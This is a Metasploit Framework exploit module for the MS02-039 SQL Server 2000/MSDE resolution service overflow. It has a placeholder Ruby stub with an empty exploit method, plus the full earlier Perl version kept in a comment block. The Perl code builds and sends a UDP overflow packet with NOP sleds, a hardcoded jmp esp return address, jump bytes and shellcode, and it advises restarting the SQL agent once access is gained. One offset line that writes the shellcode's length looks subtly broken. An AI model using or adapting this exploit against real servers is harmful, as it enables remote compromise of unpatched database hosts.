require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'MSSQL 2000/MSDE Resolution Overflow',
			'Description'    => %q{
				This is an exploit for the SQL Server 2000 resolution
				service buffer overflow. This overflow is triggered by
				sending a udp packet to port 1434 which starts with 0x04 and
				is followed by long string terminating with a colon and a
				number. This module should work against any vulnerable SQL
				Server 2000 or MSDE install (pre-SP3).
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '4578'],
					[ 'MSB', 'MS02-039'],
					[ 'MIL', '44'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 512,
					'BadChars' => "\x00\x3a\x0a\x0d\x2f\x5c",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Jul 24 2002',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::mssql2000_resolution;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };
my $info =
  {
	'Name'    => 'MSSQL 2000/MSDE Resolution Overflow',
	'Version' => '$Revision$',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>', ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000' ],
	'Priv'  => 1,

	'AutoOpts' => { 'EXITFUNC' => 'process' },
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 1434],
	  },

	'Payload'  =>
	  {
		'Space'  => 512,
		'BadChars'  => "\x00\x3a\x0a\x0d\x2f\x5c",
	  },

	'Description'  => Pex::Text::Freeform(qq{
        This is an exploit for the SQL Server 2000 resolution
        service buffer overflow. This overflow is triggered by
        sending a udp packet to port 1434 which starts with 0x04 and
        is followed by long string terminating with a colon and a
        number. This module should work against any vulnerable SQL
        Server 2000 or MSDE install (pre-SP3).   
}),

	'Refs'  =>
	  [
		['OSVDB',   '4578'],
		['MSB',     'MS02-039'],
		['MIL',     '44'],
	  ],

	'DefaultTarget' => 0,
	'Targets' => [['MSQL 2000 / MSDE',   0x42b48774]],

	'Keys'  => ['mssql'],

	'DisclosureDate' => 'Jul 24 2002',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my %r = Pex::MSSQL::Ping($self->GetVar('RHOST'), $self->GetVar('RPORT'));

	if (! keys(%r)) {
		$self->PrintLine("[*] No response recieved from SQL server");
		return $self->CheckCode('Safe');
	}

	$self->PrintLine("SQL Server '". $r{'ServerName'} ."' on port ". $r{'tcp'});
	return $self->CheckCode('Detected');
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   =$self->GetVar('EncodedPayload')->Payload;

	my $target = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}

	$self->PrintLine(sprintf("[*] Trying target %s with return address 0x%.8x", $target->[0], $target->[1]));

	# automatically restart sql server - thanks SK!
	$self->PrintLine("[*] Execute 'net start sqlserveragent' once access is obtained");

	# \x68:888 => push dword 0x3838383a
	my $request = "\x04" . $self->MakeNops(800) . "\x68:888" . "\x90" . $shellcode;

	# return address of jmp esp
	substr($request, 97, 4, pack("V", $target->[1]));

	# takes us right here, with 8 bytes available
	substr($request, 101, 8, "\xeb\x69\xeb\x69");

	# write to thread storage space ala msrpc
	substr($request, 109, 4, pack("V", 0x7ffde0cc));
	substr($request, 113, 4, pack("V", 0x7ffde0cc));

	# the payload starts here
	substr($request, 117, 100, $self->MakeNops(100));
	substr($request, 217, length($shellcode), length($shellcode));

	my $s = Msf::Socket::Udp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($request);

	sleep(1);
	return;
}


=end


end
end	
